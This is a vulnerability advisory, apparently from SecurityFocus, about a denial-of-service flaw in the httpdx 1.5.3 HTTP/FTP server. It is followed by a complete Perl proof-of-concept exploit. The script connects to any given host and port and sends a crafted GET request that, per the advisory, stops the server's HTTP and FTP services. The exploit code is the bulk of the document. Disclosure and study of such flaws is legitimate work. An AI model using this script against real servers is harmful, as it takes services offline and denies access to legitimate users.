source: http://www.securityfocus.com/bid/38638/info

The 'httpdx' program is prone to a denial-of-service vulnerbaility.

Remote attackers can exploit this issue to cause the server to stop responding, denying service to legitimate users.

This issue affects httpdx 1.5.3; other versions may also be affected. 

#!/usr/bin/perl
#
# Program          : Httpdx v1.5.3
# PoC		   : Remote Break Services
# Homepage         : http://sourceforge.net/projects/httpdx/
# Found by         : Jonathan Salwan
# This Advisory    : Jonathan Salwan
# Contact          : submit@shell-storm.org
# 
# 
# //----- Application description
# 
# Single-process HTTP1.1/FTP server; no threads or processes started per connection, runs 
# with only few threads. Includes directory listing, virtual hosting, basic auth., support 
# for PHP, Perl, Python, SSI, etc. All settings in one config/script file. 
# 
# 
# //----- Description of vulnerability
# 
# The vulnerability is caused due to an input validation error when processing HTTP requests. This can be 
# exploited to break all services http & ftp. 
# 
# 
# 
# //----- Credits
# 
# http://www.shell-storm.org 	<submit@shell-storm.org>
# 
# 


use IO::Socket;
print "\n[x]Httpdx v1.5.3 - Remote Break Services\n";

	if (@ARGV < 1)
		{
 		print "[-] Usage: <file.pl> <host> <port>\n";
 		print "[-] Exemple: file.pl 127.0.0.1 80\n";
 		exit;
		}

	$ip = $ARGV[0];
	$port = $ARGV[1];


$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-] Connecting: Failed!\n";
		
	print "[+] Sending request: GET /res~httpdx.conf/image/php.png HTTP/1.1\\r\\nHost: $ip\\r\\n\\r\\n";
	$msg = 	"GET /res~httpdx.conf/image/php.png HTTP/1.1\r\nHost: $ip\r\n\r\n";
	$socket->send($msg);

print "\n[+] Done.\n\n";

close($socket);